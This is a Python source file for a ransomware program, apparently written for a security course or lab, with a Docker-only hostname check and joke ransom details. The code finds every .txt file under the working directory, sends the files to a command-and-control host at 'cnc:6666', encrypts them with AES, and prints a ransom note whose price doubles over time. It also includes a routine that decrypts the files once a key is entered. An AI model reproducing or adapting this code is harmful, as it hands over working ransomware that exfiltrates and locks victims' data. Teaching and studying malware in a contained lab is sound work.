import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import signal
import os
import threading,time

CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

AMOGUS = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀
⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀
⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⠀
⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀
⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⢠⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿   ⠀⢸⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿ ⠀⠈⠻⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
ENCRYPT_MESSAGE = """\rYour txt files have been locked. Send an email to rick.asley@hewillnotgiveyouup.net with title '{token}' to unlock your data and send {price} BTC to the following address: {address}
The price will be multiplied by 2 every 24 hours.
"""

decrypt_message = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣔⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⡝⠉⠉⠽⣿⣃⣼⣷⠶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠫⢿⣄⠀⠀⠈⣿⠁⠀⠀⣁⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢛⣷⢂⠀⠀⠀⣀⡷⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢚⣾⠀⠀⠀⣽⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⠀⠀⠀⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⣿⡏⠉⣙⣿⣿⣷⣶⣖⣷⣶⣿⣿⡲⣶⣲⣿⢗⣶⣖⣶⣲⣾⣛⠀⠀⠀
⠀⣿⣿⠁⠀⠉⣿⣿⡟⠛⠟⠝⠏⢙⠉⠙⠉⠋⠍⠙⠙⠉⠛⠛⣿⣿⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿ ⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿  ⠀⠀⢸⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿ ⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Your txt files have been unlocked.
"""

class Ransomware:
    DOUBLE_TIME = 60 # Every 60 seconds, the price will be multiplied by 2
    MAX_PRICE = 1024 # Prix maximum
    BITCOIN_ADDRESS = "https://www.youtube.com/watch?v=v1PBptSDIh8" # I don't have a bitcoin address, so I put a link to a video 
    def __init__(self) -> None:
        self.check_hostname_is_docker()
        self.hex_token = None # token in hex
        self.timestamp = None # in seconds

        self.timestamp = int(time.time())
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter: str) -> list:
        # return all files matching the filter, excluding symlinks
        base_path = Path(".")
        matching_files = [str(file.absolute()) for file in base_path.rglob(filter) if not file.is_symlink()]
        return matching_files


    def encrypt(self):
        # Lister les fichiers txt
        files_to_encrypt = self.get_files("*.txt")

        # Créer le SecretManager
        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)

            # load the file
        plain = ""
        # Appeler setup()
        secret_manager.setup()


        # Envoyer les fichiers à l'attaquant
        secret_manager.leak_files(files_to_encrypt)
        # # Chiffrer les fichiers
        # secret_manager.xorfiles(files_to_encrypt)
        secret_manager.aesfiles(files_to_encrypt)

        # Afficher un message permettant à la victime de contacter l'attaquant avec le token au format hex.
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))



    #  Actualise régulièrement le prix de la rançon 
    def countdown(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(AMOGUS.format())
        while True:
            price = 1 * 2 ** (int(time.time() - self.timestamp) // self.DOUBLE_TIME)
            if price > self.MAX_PRICE:
                price = self.MAX_PRICE
            print(ENCRYPT_MESSAGE.format(token=self.hex_token, price=price, address=self.BITCOIN_ADDRESS))
            
            # Afficher le message pour entrer la clé de déchiffrement
            print("\nEnter the decryption key:", end=" ")
            sys.stdout.flush()

            time.sleep(2)

            # Remonter d'une ligne pour réécrire le temps restant à la prochaine itération
            sys.stdout.write("\033[5A")
            sys.stdout.flush()

    def decrypt(self):


        # Load cryptographic elements and the list of encrypted files
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.load()

        self.hex_token = secret_manager.get_hex_token()

        encrypted_files = self.get_files("*.txt")


        thread_countdown = threading.Thread(target=self.countdown)
        thread_countdown.start()

        while True:
            try:
                # Ask for the key
                b64_key = input("")
                # Set the key
                secret_manager.set_key(b64_key)

                # Decrypt the files
                # secret_manager.xorfiles(encrypted_files)
                secret_manager.unaesfiles(encrypted_files)

                # Clean up local cryptographic elements
                secret_manager.clean()

                # Display a message to inform the user that everything went well
                print(decrypt_message)

                # Exit the ransomware
                break
            except ValueError as e:
                print(f"\nPlease provide a valid decryption key.", end="")
                sys.stdout.write("\033[2A")
                sys.stdout.flush()
                #clear the full line
                sys.stdout.write("\033[2K")
                sys.stdout.flush()
                #reprint the message
                print("\rEnter the decryption key:", end="")
                pass
            except Exception as e:
                print(f"\nUnexpected error occurred during decryption")
                break



if __name__ == "__main__":
    # signal.signal(signal.SIGINT, signal.SIG_IGN)
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()